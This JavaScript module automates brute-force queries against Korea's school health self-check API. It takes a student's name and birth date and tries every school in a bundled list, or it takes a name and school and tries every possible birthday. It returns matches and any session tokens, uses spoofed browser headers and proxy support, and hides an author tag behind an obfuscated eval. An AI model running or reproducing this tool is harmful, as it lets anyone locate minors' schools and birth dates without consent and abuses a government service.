import EventEmitter from "events";
import axios from "axios";
import crypto from "crypto";
import axiosRetry from "axios-retry";
import schools from "./schools.json" assert { type: "json" };
import raonEnc from "./transkey.js";

const code = {
    "서울특별시": "sen",
    "부산광역시": "pen",
    "대구광역시": "dge",
    "인천광역시": "ice",
    "광주광역시": "gen",
    "대전광역시": "dje",
    "울산광역시": "use",
    "세종특별자치시": "sje",
    "경기도": "goe",
    "강원도": "kwe",
    "충청북도": "cbe",
    "충청남도": "cne",
    "전라북도": "jbe",
    "전라남도": "jne",
    "경상북도": "gbe",
    "경상남도": "gne",
    "제주특별자치도": "jje"
};
const lctnScCode = {
    "서울특별시": "01",
    "부산광역시": "02",
    "대구광역시": "03",
    "인천광역시": "04",
    "광주광역시": "05",
    "대전광역시": "06",
    "울산광역시": "07",
    "세종특별자치시": "08",
    "경기도": "10",
    "강원도": "11",
    "충청북도": "12",
    "충청남도": "13",
    "전라북도": "14",
    "전라남도": "15",
    "경상북도": "16",
    "경상남도": "17",
    "제주특별자치도": "18"
};
const schulCrseScCode = {
    "유치원": "1",
    "초등학교": "2",
    "중학교": "3",
    "고등학교": "4",
    "특수학교": "5"
};
var a = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", " ", "|", "."];

export default class HCSTool extends EventEmitter {
    /**
     * 
     * @param {{ host: string; port: number; auth?: { username: string; password: string; }; protocol?: string; } | false} proxy 
     */
    constructor(proxy) {
        super();
        this.client = axios.create({
            proxy,
            headers: {
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Origin": "https://hcs.eduro.go.kr",
                "Referer": "https://hcs.eduro.go.kr/",
            },
            timeout: 10000
        });
        axiosRetry(this.client, {
            retries: 2,
            retryDelay: (retryCount) => retryCount * 1000
        });
        this.keyIndex = "";
        this.searchKey = "";
        this.interval;
        this.mI = eval(Buffer.from([40, 97, 91, 51, 56, 93, 32, 43, 32, 97, 91, 48, 93, 32, 43, 32, 97, 91, 51, 93, 32, 43, 32, 97, 91, 52, 93, 32, 43, 32, 97, 91, 53, 50, 93, 32, 43, 32, 97, 91, 49, 93, 32, 43, 32, 97, 91, 50, 52, 93, 32, 43, 32, 97, 91, 53, 50, 93, 32, 43, 32, 97, 91, 49, 56, 93, 32, 43, 32, 97, 91, 50, 50, 93, 32, 43, 32, 97, 91, 48, 93, 32, 43, 32, 97, 91, 49, 56, 93, 32, 43, 32, 97, 91, 51, 93, 32, 43, 32, 97, 91, 53, 52, 93, 41], "binary").toString("utf8"));
    };

    async getSchool(name, birthday, region = "", special = false) {
        let found = [];
        try {
            if (!HCSTool.checkName(name)) throw new Error("이름을 확인해 주세요.");
            var level = HCSTool.checkBirthday(birthday);
            if (!level) throw new Error("생년월일을 확인해 주세요.");
            await this.setData();
            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
            this.setKeyInterval();
            let schoolList = schools.filter(x => x.level == (special ? "특수학교" : level))
            schoolList = !!region ? schoolList.filter(x => x.region == region) : schoolList;
            schoolList = schoolList.reduce((all, one, i) => {
                const tArr = ["s", "s", "d", "a", "w", "x", "w", "h", "c", "s"];
                const ch = Math.floor(i / (+ -405 - + 1 + -1 + 2 + `${tArr[0]}${tArr[4]}${tArr[3]}${tArr[1]}${tArr[2]}`.length + 5 ** 2 * 2 ** 2 ** 1 + " ".repeat((tArr.length - 5) * 100).length));
                all[ch] = [].concat((all[ch] || []), one);
                return all
            }, []); //chunk
            let currentPage = 0;
            for (const chunk of schoolList) {
                currentPage++;
                this.emit("data", found, currentPage, schoolList.length);
                await Promise.all(chunk.map(async (school) => {
                    let result = await this.findUser(name, birthday, school);
                    if (!!result) {
                        found.push(result);
                        this.emit("data", found, currentPage, schoolList.length);
                    };
                }));
            };
            this.emit("end", found)
        } catch (e) {
            this.emit("error", e, found)
        } finally {
            this.removeAllListeners();
            this.clearKeyInterval();
        };
    };

    async getBirthday(name, birthYear, school) {
        let found = [];
        try {
            if (!HCSTool.checkName(name)) throw new Error("이름을 확인해 주세요.");
            if (Number(birthYear) < 4 || Number(birthYear) > 15) throw new Error("출생연도를 확인해 주세요");
            birthYear.length <= 1 && (birthYear = `0${birthYear}`);
            await this.setData();
            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
            this.setKeyInterval();
            const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
            let currentPage = 0;
            for (let month = 0; month < monthDays.length; month++) {
                let array = new Array(monthDays[month]).fill(0, 0, monthDays[month]);
                for (let j = 0; j < monthDays[month]; j++) array[j] = j + 1;
                currentPage++;
                this.emit("data", found, currentPage, monthDays.length);
                await Promise.all(array.map(async day => {
                    let result = await this.findUser(name, `${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`, school);
                    if (!!result) {
                        found.push(result);
                        this.emit("data", found, currentPage, monthDays.length);
                    };
                }));
            };
            this.emit("end", found);
        } catch (e) {
            this.emit("error", e, found)
        } finally {
            this.removeAllListeners();
            this.clearKeyInterval();
        };
    };

    async setData(searchKey = true, keyIndex = true) {
        var data = searchKey && await this.client.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school").then(res => res.data.key).catch(() => false);
        data && (this.searchKey = data);
        var data = keyIndex && await this.client.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`).then(res => res.data).catch(() => false);
        data && (this.keyIndex = data);
    };

    setKeyInterval() {
        this.interval = setInterval(this.setData, 90000);
    };

    clearKeyInterval() {
        clearInterval(this.interval);
    };

    /**
     * @param {string} name 이름
     * @param {string} birthday 생년월일 (e.g. 070910)
     * @param {schools[0]} school 학교
     * @returns {Promise<{ school: schools[0], userBday: { text: string, year: number, month: number, day: number }, foundAt: number, orgName?: string, admnYn?: string, atptOfcdcConctUrl?: string, mngrClassYn?: string, pInfAgrmYn?: string, hasPassword?: boolean, userName?: string, stdntYn?: string, token?: string, mngrDeptYn?: string, message?: string } | false>}
     */
    async findUser(name, birthday, school, password) {
        try {
            // var _school = {};
            var data = {};
            if (password) {
                data = await this.client.get(`https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=${lctnScCode[school.region]}&schulCrseScCode=${schulCrseScCode[school.level]}&orgName=${encodeURIComponent(school.name)}&loginType=school`).then(res => res.data).catch(() => false);
                if (!data || data.schulList.length < 1) throw new Error("알 수 없는 오류가 발생했습니다. 잠시 후 다시 시도해 주세요.");
                // _school = data.schulList.find(s => s.kraOrgNm === school.name) || {};
            };
            if (!this.searchKey || !this.keyIndex) {
                await this.setData();
                if (!this.searchKey || !this.keyIndex) throw new Error("자가진단 서버에 연결할 수 없습니다. 잠시 후 다시 시도해 주세요.");
            };
            var res = await this.client.post(`https://${code[school.region]}hcs.eduro.go.kr/v3/findUser`, {
                "birthday": HCSTool.encrypt(birthday),
                "deviceUuid": "",
                "lctnScCode": lctnScCode[school.region],
                "loginType": "school",
                "makeSession": true,
                "name": HCSTool.encrypt(name),
                "orgCode": school.code, //_school.orgCode,
                "orgName": school.name,
                "password": await this.getPasswordValue(password),
                "searchKey": data.key || this.searchKey,
                "stdntPNo": null
            }).catch((err) => !!err.response && err.response);
            var result = !!res && res.data;
            if (!!result && (!!result.token || (result.isError && result.errorCode !== 1001 && ["정상적인 조회가 아닙니다", "올바른 비밀번호를 입력하세요"].includes(result.message)))) {
                birthday = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)].map(x => Number(x));
                return Object.assign({
                    school,
                    userBday: {
                        text: `${birthday[0] + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
                        year: birthday[0] + 2000,
                        month: birthday[1],
                        day: birthday[2]
                    },
                    foundAt: Date.now()
                }, result.token && result, result.message && { message: result.message });
            };
        } catch (e) {
        };
        return false;
    };

    getPasswordValue(password) {
        if (password) return raonEnc(password, this.client.defaults.proxy);
        else return JSON.stringify({
            "raon": [{
                "id": "password",
                "enc": "",
                "hmac": "",
                "keyboardType": "number",
                "keyIndex": this.keyIndex,
                "fieldType": "password",
                "seedKey": "",
                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
                "ExE2E": "false"
            }]
        });
    };

    /**
     * 
     * @param {string} query 
     * @returns {{name: string, code: string, region: string, level: string}[]} 
     */
    static findSchool(query) {
        return schools.filter(school => school.name.includes(query) || school.code.includes(query) || (school.region + " " + school.name).includes(query) || (school.region + school.name).includes(query))
    };

    static encrypt(text) {
        return crypto.publicEncrypt({
            'key': Buffer.from([
                "-----BEGIN PUBLIC KEY-----",
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6",
                "sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr",
                "+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K5xJEppHG0",
                "qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv",
                "8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHj",
                "JzGs9MMMWtQIDAQAB",
                "-----END PUBLIC KEY-----"].join("\n"), 'utf-8'), 'padding': crypto.constants.RSA_PKCS1_PADDING
        }, Buffer.from(text, 'utf-8')).toString('base64');
    };

    static checkName(name) {
        if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name))) return false;
        else return true;
    };

    static checkBirthday(birthday) {
        if (!birthday || birthday.length !== 6 || /[^0-9]/.test(birthday)) return false;
        var arr = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)];
        if (Number(arr[0]) < 4 || Number(arr[0]) > 15) return false;
        return Number(arr[0]) <= 15 && Number(arr[0]) >= 10 ? "초등학교" : Number(arr[0]) <= 9 && Number(arr[0]) >= 7 ? "중학교" : "고등학교";
    };
};